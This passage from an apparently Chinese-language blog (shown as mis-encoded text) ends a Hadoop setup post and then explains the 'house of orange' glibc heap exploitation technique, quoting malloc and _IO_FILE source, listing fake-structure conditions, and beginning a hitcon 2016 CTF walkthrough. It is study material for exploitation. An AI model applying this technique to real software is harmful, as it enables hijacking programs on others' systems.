<p><img src="http://static.zybuluo.com/hgggg/zxvawc5xy43rovhkvrx8pfdh/16.png" alt="16.png-34.8kB"></p>
<p>å¯åŠ¨</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hdfs namenode -format</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/hadoop/sbin</span><br><span class="line">start-all.sh</span><br></pre></td></tr></table></figure>
<p>è®¿é—®æœ¬åœ°çš„8088ï¼Œå’Œ50070ç«¯å£<br>
<img src="http://static.zybuluo.com/hgggg/l1bzsn3ye3uw1tirknb77a5f/17.png" alt="17.png-119.7kB"><br>
<img src="http://static.zybuluo.com/hgggg/5qeojvvshsss60h0as574hxz/18.png" alt="18.png-125.6kB"></p>
<h3 id="Step3-å¹³å°æ“ä½œ"><a class="header-anchor" href="#Step3-å¹³å°æ“ä½œ">Â¶</a>Step3 å¹³å°æ“ä½œ</h3>
<p>æ–°å»ºç›®å½•</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hadoop fs -mkdir /tmp/input</span><br></pre></td></tr></table></figure>
<p>ä¸Šä¼ æœ¬åœ°æ–‡ä»¶</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hadoop fs -put exp.py /tmp/input</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/d3viipvnn25ye9im21h3ljoc/19.png" alt="19.png-68kB"><br>
æŸ¥çœ‹</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hadoop fs -cat /tmp/input/exp.py</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/u2c9qffjgyb2pmu9276fdd79/20.png" alt="20.png-42.2kB"></p>
<h3 id="å‚è€ƒ"><a class="header-anchor" href="#å‚è€ƒ">Â¶</a>å‚è€ƒ</h3>
<p><a href="https://blog.csdn.net/kh896424665/article/details/78765175">https://blog.csdn.net/kh896424665/article/details/78765175</a><br>
<a href="https://www.cnblogs.com/biehongli/p/7026809.html">https://www.cnblogs.com/biehongli/p/7026809.html</a></p>
]]></content>
      <categories>
        <category>å®éªŒæŠ¥å‘Š</category>
      </categories>
      <tags>
        <tag>å¤§æ•°æ®</tag>
        <tag>ç¯å¢ƒæ­å»º</tag>
      </tags>
  </entry>
  <entry>
    <title>house of orange</title>
    <url>/2021/10/04/house-of-orange/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/22.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="åˆ©ç”¨åœºæ™¯"><a href="#åˆ©ç”¨åœºæ™¯" class="headerlink" title="åˆ©ç”¨åœºæ™¯"></a>åˆ©ç”¨åœºæ™¯</h2><pre><code>æ— freeå‡½æ•°çš„å †æº¢å‡ºï¼šæ²¡æœ‰freeå‡½æ•°ï¼Œæˆ–è€…æ˜¯æ— æ³•è°ƒç”¨freeå‡½æ•°freeæŒ‡å®šçš„å †å—
</code></pre><h2 id="malloc-top-chunk-æºç åˆ†æ"><a href="#malloc-top-chunk-æºç åˆ†æ" class="headerlink" title="malloc top chunk æºç åˆ†æ"></a>malloc top chunk æºç åˆ†æ</h2><p><img src="http://static.zybuluo.com/hgggg/l40dvsvhi9dxg2pbicbn4yiz/9.png" alt="9.png-18.8kB"><br>å¦‚å›¾æ‰€ç¤ºï¼Œå½“æˆ‘ä»¬å¯ä»¥ä»heapå¤„æº¢å‡ºçš„æ—¶å€™ï¼Œå°±å¯ä»¥è¦†ç›–top chunkçš„sizeå’Œp_sizeï¼ˆä¸Šé¢è¿™å¼ å›¾ç”»çš„æ—¶å€™ç”»é”™äº†Pæ‰“æˆDäº†ï¼‰</p>
<p>æ¥ä¸‹æ¥æ¥çœ‹top chunkçš„æºç <br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">     here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å½“ç”¨æˆ·ç”³è¯·çš„chunk sizeå°äºtop chunk sizeæ—¶ï¼Œä¼šä»top chunkä¸­åˆ†å‰²ä¸€éƒ¨åˆ†ç»™ç”¨æˆ·ä½¿ç”¨</p>
<p>è€Œå½“ç”¨æˆ·ç”³è¯·çš„chunk sizeå¤§äºtop chunk sizeæ—¶ï¼Œåˆ™ä¼šå»è°ƒç”¨sysmalloc</p>
<p>æ¥çœ‹ä¸‹syscall </p>
<p>å¦‚æœarenaä¸ºç©ºæˆ–è€…éœ€è¦åˆ†é…çš„å†…å­˜å¤§å°å¤§äºä½¿ç”¨mmapè¿›è¡Œåˆ†é…çš„é˜€å€¼mp_.mmap_thresholdä¸”mp_.n_mmapsåˆ¤æ–­ç³»ç»Ÿè¿˜å¯ä»¥æœ‰å¯ä»¥ä½¿ç”¨mmapåˆ†é…çš„ç©ºé—´ï¼Œå°±ä¼šå»è°ƒç”¨mmapæ¥åˆ†é…å†…å­˜<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">    || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line"> &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">  try_mmap:</span><br><span class="line">         <span class="comment">/* çœç•¥ */</span></span><br></pre></td></tr></table></figure><br>æ¥ä¸‹æ¥ä¼šå¯¹top chunkè¿›è¡Œæ£€æŸ¥<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">old_top = av-&gt;top;      <span class="comment">/* top chunk çš„æŒ‡é’ˆ */</span></span><br><span class="line">old_size = chunksize (old_top);   <span class="comment">/* top chunk çš„å¤§å° */</span></span><br><span class="line">old_end = (<span class="keyword">char</span> *) (chunk_at_offset (old_top, old_size)); <span class="comment">/* top chunk çš„å°¾éƒ¨åœ°å€ */</span></span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="keyword">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>è¿™ä¹‹åä¼šå¯¹top chunk è¿›è¡Œæ‰©å±•,å½“arena == main arenaæ—¶ä¼šå…ˆè°ƒç”¨grow_heapæ¥æ‰©å±•ï¼Œè‹¥æ‰©å±•å¤±è´¥ï¼Œåˆ™ä¼šè¿›å…¥elesè·¯çº¿ï¼Œæœ€ç»ˆè§¦å‘ _int_free (av, old_top, 1)<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  &#123;</span><br><span class="line">    heap_info *old_heap, *heap;</span><br><span class="line">    <span class="keyword">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try to extend the current heap. */</span></span><br><span class="line">    old_heap = heap_for_ptr (old_top);</span><br><span class="line">    old_heap_size = old_heap-&gt;size;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">        &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">        arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">        set_head (old_top, (((<span class="keyword">char</span> *) old_heap + old_heap-&gt;size) - (<span class="keyword">char</span> *) old_top)</span><br><span class="line">                  | PREV_INUSE);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="keyword">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">      &#123;</span><br><span class="line">          ......</span><br><span class="line">        <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">            set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">            set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">            _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><br>åŒç†ï¼Œå½“arena != main_arena æ—¶ä¹Ÿä¼šè§¦å‘  _int_free (av, old_top, 1)<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (snd_brk != (char *) (MORECORE_FAILURE))</span><br><span class="line">  &#123;</span><br><span class="line">    av-&gt;top = (mchunkptr) aligned_brk;</span><br><span class="line">    set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);</span><br><span class="line">    av-&gt;system_mem += correction;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">       If not the first time through, we either have a</span><br><span class="line">       gap due to foreign sbrk or a non-contiguous region.  Insert a</span><br><span class="line">       double fencepost at old_top to prevent consolidation with space</span><br><span class="line">       we don&#x27;t own. These fenceposts are artificial chunks that are</span><br><span class="line">       marked as inuse and are in any case too small to use.  We need</span><br><span class="line">       two to make sizes and alignments work out.</span><br><span class="line">     */</span><br><span class="line"></span><br><span class="line">    if (old_size != 0)</span><br><span class="line">      &#123;</span><br><span class="line">        /*</span><br><span class="line">           Shrink old_top to insert fenceposts, keeping size a</span><br><span class="line">           multiple of MALLOC_ALIGNMENT. We know there is at least</span><br><span class="line">           enough space in old_top to do this.</span><br><span class="line">         */</span><br><span class="line">        old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">        set_head (old_top, old_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">           Note that the following assignments completely overwrite</span><br><span class="line">           old_top when old_size was previously MINSIZE.  This is</span><br><span class="line">           intentional. We need the fencepost, even if old_top otherwise gets</span><br><span class="line">           lost.</span><br><span class="line">         */</span><br><span class="line">        chunk_at_offset (old_top, old_size)-&gt;size =</span><br><span class="line">          (2 * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">        chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)-&gt;size =</span><br><span class="line">          (2 * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">        /* If possible, release the rest. */</span><br><span class="line">        if (old_size &gt;= MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            _int_free (av, old_top, 1);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><br>ç”»ä¸ªç®€å•çš„æµç¨‹å›¾æ¥æ€»ç»“ä¸€ä¸‹</p>
<p><img src="http://static.zybuluo.com/hgggg/o5w1swm10mrscnnqtes1l2bo/10.png" alt="10.png-53.6kB"><br><strong>ç»¼ä¸Šæ‰€è¿° ï¼Œ å½“æˆ‘ä»¬æ§åˆ¶top chunkçš„å¤§å°ä¸ºunsorted binçš„å¤§å°æ—¶ï¼Œå°±å¯ä»¥unsorted bin attact</strong></p>
<h2 id="malloc-printerr-æºç åˆ†æ"><a href="#malloc-printerr-æºç åˆ†æ" class="headerlink" title="malloc_printerr æºç åˆ†æ"></a>malloc_printerr æºç åˆ†æ</h2><p>malloc_printerræ˜¯mallocä¸­ç”¨äºæç¤ºé”™è¯¯çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨<strong>libc_message<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">malloc_printerr (<span class="keyword">int</span> action, <span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">void</span> *ptr, mstate ar_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Avoid using this arena in future.  We do not attempt to synchronize this</span></span><br><span class="line"><span class="comment">     with anything else because we minimally want to ensure that __libc_message</span></span><br><span class="line"><span class="comment">     gets its resources safely without stumbling on the current corruption.  */</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr)</span><br><span class="line">    set_arena_corrupt (ar_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((action &amp; <span class="number">5</span>) == <span class="number">5</span>)</span><br><span class="line">    __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> buf[<span class="number">2</span> * <span class="keyword">sizeof</span> (<span class="keyword">uintptr_t</span>) + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="keyword">char</span> *cp = _itoa_word ((<span class="keyword">uintptr_t</span>) ptr, &amp;buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>], <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> (cp &gt; buf)</span><br><span class="line">        *--cp = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">&quot;&lt;unknown&gt;&quot;</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è·Ÿè¿›</strong>libc_message,æœ€ç»ˆä¼šè°ƒç”¨abort()æ¥åˆ‡æ–­è¿›ç¨‹<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (do_abort)</span><br><span class="line">  &#123;</span><br><span class="line">    BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Kill the application.  */</span></span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>ç»§ç»­è·Ÿè¿›,abroté‡Œé¢ä¼šè°ƒç”¨fflush<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (stage == 1)</span><br><span class="line">  &#123;</span><br><span class="line">    ++stage;</span><br><span class="line">    fflush (NULL);</span><br><span class="line">  &#125;c</span><br></pre></td></tr></table></figure><br>å¯ä»¥å¾—åˆ°ä¸€æ¡è°ƒç”¨é“¾<br>_IO_fflush -&gt; _IO_flush_all -&gt; _IO_flush_all_lockp</p>
<p>_IO_flush_all_lockpä»_IO_list_allä½œä¸ºé“¾è¡¨å¤´è¿›è¡Œéå†ï¼Œä»¥å½“å‰èŠ‚ç‚¹ä½œä¸º _IO_OVERFLOWçš„å‚æ•°<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">	  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	  last_stamp = _IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>_IO_OVERFLOWçš„å®šä¹‰å¦‚ä¸‹,å®ƒä¼šå»è°ƒç”¨<strong>overflowå‡½æ•°ï¼Œè€Œ</strong>overflowå‡½æ•°åˆå’Œ_IO_FILEé‡Œçš„å‡½æ•°ç›¸å…³<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><br>å¦‚æœæˆ‘ä»¬æœ€ç»ˆå¯ä»¥ä¼ªé€ IO_FILEç»“æ„ï¼Œå°±å¯ä»¥è¾¾åˆ°åŠ«æŒç¨‹åºæµçš„ç›®çš„</p>
<p>_IO_FILEç»“æ„å¦‚ä¸‹ï¼Œstruct _IO_FILE <em>_chainæ˜¯ä¸€ä¸ªç”¨äºæŒ‡å‘_IO_FILEä¸­ä¸‹ä¸€ä¸ªæˆå‘˜çš„æŒ‡é’ˆ<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>   _IO_FILEä½œä¸ºä¸€ä¸ªå•é“¾è¡¨ç»“æ„ï¼Œ_IO_list_allä½œä¸ºè¡¨å¤´ï¼Œåˆ©ç”¨ä¹‹å‰å¾—åˆ°çš„unsorted bin<br>åˆ™å¯ä»¥åŠ«æŒ_IO_list_allï¼Œå°†_IO_list_allçš„å€¼ä¼ªé€ ä¸ºmain_arena+88ã€‚æ­¤æ—¶main_arena+88<br>ä½œä¸º_IO_FILEçš„å¤´ï¼Œä½†æ˜¯ç”±äºmain_arena+88æ˜¯ä¸å¯æ§çš„ï¼Œæ‰€ä»¥ä¸èƒ½åœ¨æ­¤å¤„ä¼ªé€ ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡<br>struct _IO_FILE </em>_chainå°†å…¶é“¾æ¥åˆ°ä¸€ä¸ªå¯æ§çš„åœ°æ–¹æ¥ä¼ªé€ æˆ‘ä»¬çš„_IO_FILEã€‚å½“è°ƒç”¨_IO_FILE<br>æ—¶ï¼Œç”±äºmian_arena+88çš„æ•°æ®ä¸ç¬¦åˆï¼Œå°±ä¼šé€šè¿‡*_chainå»å‘åæœç´¢ï¼Œå½“æœç´¢åˆ°æˆ‘ä»¬ä¼ªé€ å¥½çš„<br>_IO_FILEç»“æ„ä½“æ—¶å°±ä¼šè°ƒç”¨å…¶è™šè¡¨é‡Œçš„å‡½æ•°ã€‚</p>
<p>   è€Œå¦‚æœå°†main_arena+88å¤„çœ‹ä½œä¸€ä¸ª_IO_FILEç»“æ„ä½“ï¼Œé‚£ä¹ˆstruct _IO_FILE *_chain<br>æŒ‡é’ˆçš„ä½ç½®ä¸ºmain_arena+88+0x68ï¼Œè¯¥ä½ç½®åˆšå¥½æ˜¯0x60å¤§å°çš„small binç¬¬ä¸€ä¸ªchunkçš„åœ°å€ã€‚<br>å¦‚æœå°†ä¼ªé€ å¥½çš„_IO_FILEç»“æ„ä½“å¸ƒç½®åœ¨é‚£é‡Œï¼Œé‚£ä¹ˆå½“ç¨‹åºæ‰§è¡Œ_IO_OVERFLOWæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥åŠ«æŒ<br>ç¨‹åºæµ</p>
<p>   é‚£ä¹ˆå¦‚ä½•å¾—åˆ°ä¸€ä¸ªå¤§å°ä¸º0x60çš„small binå‘¢ï¼Œåœ¨æ„é€ unsorted binçš„æ—¶å€™æˆ‘ä»¬å¯ä»¥å°†å…¶size<br>è¦†ç›–ä¸º0x60ï¼Œè¿™æ ·åœ¨å‘ç”Ÿunsorted bin éå†æ—¶å°±ä¼šå°†è¿™ä¸ªunsorted bin é“¾å…¥åˆ°small binä¸­ï¼Œä»£<br>ç å¦‚ä¸‹<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br></pre></td></tr></table></figure></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><pre><code>åœ¨ä¼ªé€ _IO_FILEç»“æ„æ—¶éœ€è¦æ³¨æ„ä¸€ä¸‹å‡ ç‚¹
1.fp-&gt;mode = 0
2._IO_write_ptr &lt; _IO_write_base
3._IO_read_ptr = 0x60 (small bin [4])
4._IO_read_base = _IO_list_all - 0x10 (unsorted bin bk)
</code></pre><h2 id="åˆ—é¢˜"><a href="#åˆ—é¢˜" class="headerlink" title="åˆ—é¢˜"></a>åˆ—é¢˜</h2><h3 id="hitcon-2016-houseoforange"><a href="#hitcon-2016-houseoforange" class="headerlink" title="hitcon_2016_houseoforange"></a>hitcon_2016_houseoforange</h3><h4 id="IDAåˆ†æ"><a href="#IDAåˆ†æ" class="headerlink" title="IDAåˆ†æ"></a>IDAåˆ†æ</h4><p>build  é™¤äº†é™åˆ¶äº†ç”³è¯·æ¬¡æ•°ä¸º3å¤–æ²¡ä»€ä¹ˆç‰¹åˆ«çš„<br><img src="http://static.zybuluo.com/hgggg/1rppiar2k3d5r9q6vdluva12/11.png" alt="11.png-77.8kB"></p>
<p>æ¼æ´åœ¨updateä¸Š å¯ä»¥é€ æˆå †æº¢å‡ºï¼Œå¾—åˆ°unsorted bin<br><img src="http://static.zybuluo.com/hgggg/0hej1whkm528phy92uxta6qc/12.png" alt="12.png-66.3kB"></p>
<h4 id="Step1-ä¿®æ”¹top-chunk-size"><a href="#Step1-ä¿®æ”¹top-chunk-size" class="headerlink" title="Step1 ä¿®æ”¹top chunk size"></a>Step1 ä¿®æ”¹top chunk size</h4><p><img src="http://static.zybuluo.com/hgggg/ji99l97thw1lo8txj2w6ft3z/13.png" alt="13.png-90.3kB"></p>
